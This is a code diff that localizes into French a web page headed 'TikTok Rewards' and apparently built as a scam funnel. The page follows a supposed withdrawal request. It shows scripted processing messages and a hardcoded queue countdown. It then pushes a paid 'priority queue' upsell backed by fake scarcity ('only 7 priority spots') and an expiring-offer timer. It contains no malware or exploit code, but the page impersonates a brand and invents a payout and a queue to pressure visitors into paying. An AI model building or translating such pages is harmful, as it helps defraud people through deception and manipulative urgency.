@@ -6,15 +6,15 @@ import { CheckCircle2, Clock, Zap, ShieldCheck, ArrowRight, AlertCircle } from "
 export const Route = createFileRoute("/obrigado3")({
   head: () => ({
     meta: [
-      { title: "Procesando solicitud | TikTok Rewards" },
+      { title: "Traitement de votre demande | TikTok Récompenses" },
       {
         name: "description",
-        content: "Estamos procesando su solicitud de retiro.",
+        content: "Nous traitons votre demande de retrait.",
       },
-      { property: "og:title", content: "Procesando solicitud" },
+      { property: "og:title", content: "Traitement de votre demande" },
       {
         property: "og:description",
-        content: "Estamos procesando su solicitud de retiro.",
+        content: "Nous traitons votre demande de retrait.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -32,10 +32,10 @@ function Obrigado3() {
   const [spotsLeft, setSpotsLeft] = useState(7);
   
   const statusMessages = [
-    "Validando pago",
-    "Gerando acesso",
-    "Reservando prioridade",
-    "Finalizando processo"
+    "Vérification du paiement",
+    "Génération de l’accès",
+    "Réservation de la priorité",
+    "Finalisation du processus"
   ];
 
   const queueSteps = [327, 198, 96, 41];
@@ -127,10 +127,10 @@ function Obrigado3() {
              <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/[0.02] to-transparent pointer-events-none" />
              
              <h1 className="text-white text-[24px] font-black text-center mb-2 tracking-tight">
-               Estamos processando sua solicitação...
+               Nous traitons votre demande...
              </h1>
              <p className="text-neutral-500 text-[14px] text-center mb-10">
-               Aguarde alguns segundos. Estamos reservando sua prioridade.
+               Patientez quelques secondes, nous réservons votre priorité.
              </p>
 
              {/* Progress Bar Container */}
@@ -186,16 +186,16 @@ function Obrigado3() {
 
            <div className="text-center mb-8">
              <h2 className="text-white text-[28px] font-black leading-tight mb-4">
-               Sua solicitação foi recebida.
+               Votre demande a bien été reçue.
              </h2>
              <p className="text-neutral-400 text-[15px] leading-relaxed">
-               Seu pedido foi registrado com sucesso. Neste momento ele está passando pelo processo de liberação. Para manter a ordem de atendimento, existe uma fila de processamento.
+               Votre demande a bien été enregistrée. Elle suit actuellement le processus de déblocage. Pour respecter l’ordre d’arrivée, une file de traitement est en place.
              </p>
            </div>
 
            {/* Queue Display */}
            <div className="bg-white/5 rounded-2xl p-6 border border-white/5 flex flex-col items-center mb-8 relative">
-              <span className="text-[12px] font-bold text-neutral-500 uppercase tracking-widest mb-1">POSIÇÃO NA FILA</span>
+              <span className="text-[12px] font-bold text-neutral-500 uppercase tracking-widest mb-1">POSITION DANS LA FILE</span>
               <div className="text-[48px] font-black text-white tabular-nums tracking-tighter transition-all duration-500 scale-110">
                 #{queuePosition}
               </div>
@@ -209,28 +209,28 @@ function Obrigado3() {
            <div className="border-t border-white/10 pt-8 mt-2">
              <div className="flex items-center justify-center gap-2 mb-4">
                <Zap className="text-[#25f4ee]" size={18} />
-               <h3 className="text-white text-[19px] font-bold">Antecipe sua posição na fila.</h3>
+               <h3 className="text-white text-[19px] font-bold">Passez devant dans la file.</h3>
              </div>
              
              <p className="text-neutral-400 text-[14px] text-center mb-8">
-               Você pode entrar na fila prioritária e acelerar o processamento da sua solicitação. Esta oportunidade está disponível apenas neste momento.
+               Vous pouvez rejoindre la file prioritaire et accélérer le traitement de votre demande. Cette possibilité n’est disponible qu’en ce moment.
              </p>
 
              {/* Scarcity Banner */}
              <div className="flex items-center justify-center gap-2 bg-[#ff3b5c]/10 rounded-full py-2 px-4 mb-6 border border-[#ff3b5c]/20">
                 <AlertCircle className="text-[#ff3b5c]" size={14} />
                 <span className="text-[#ff3b5c] text-[12px] font-bold">
-                  APENAS {spotsLeft} VAGAS PRIORITÁRIAS DISPONÍVEIS
+                  PLUS QUE {spotsLeft} PLACES PRIORITAIRES DISPONIBLES
                 </span>
              </div>
 
              {/* Benefits List */}
              <div className="grid grid-cols-1 gap-4 mb-10">
                 {[
-                  { icon: <Clock size={16} />, text: "Atendimento prioritário" },
-                  { icon: <Zap size={16} />, text: "Processamento acelerado" },
-                  { icon: <ShieldCheck size={16} />, text: "Liberação mais rápida" },
-                  { icon: <Zap size={16} />, text: "Prioridade na fila" },
+                  { icon: <Clock size={16} />, text: "Traitement prioritaire" },
+                  { icon: <Zap size={16} />, text: "Traitement accéléré" },
+                  { icon: <ShieldCheck size={16} />, text: "Déblocage plus rapide" },
+                  { icon: <Zap size={16} />, text: "Priorité dans la file" },
                 ].map((item, i) => (
                   <div key={i} className="flex items-center gap-3 bg-white/[0.02] p-3 rounded-xl border border-white/5">
                     <div className="text-[#25f4ee]">{item.icon}</div>
@@ -247,7 +247,7 @@ function Obrigado3() {
 
                 >
                   <span className="relative z-10 flex items-center justify-center gap-2">
-                    🚀 ANTECIPAR MINHA FILA
+                    🚀 PASSER EN PRIORITAIRE
                   </span>
                   {/* Glossy animated shine */}
                   <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full animate-[shimmer_2s_infinite] pointer-events-none" />
@@ -256,7 +256,7 @@ function Obrigado3() {
 
              {/* Timer */}
              <div className="mt-6 flex flex-col items-center">
-                <span className="text-neutral-600 text-[11px] font-bold uppercase tracking-widest mb-1">OFERTA EXPIRA EM</span>
+                <span className="text-neutral-600 text-[11px] font-bold uppercase tracking-widest mb-1">L’OFFRE EXPIRE DANS</span>
                 <span className="text-[#25f4ee] font-mono text-[20px] font-bold tracking-wider">{formatTime(timeLeft)}</span>
              </div>
            </div>
@@ -267,7 +267,7 @@ function Obrigado3() {
           className="text-neutral-600 text-[13px] font-medium hover:text-neutral-400 transition-colors flex items-center gap-2"
           onClick={() => {}}
         >
-          Não, prefiro continuar aguardando.
+          Non, je préfère continuer à attendre.
           <ArrowRight size={14} />
         </button>
 
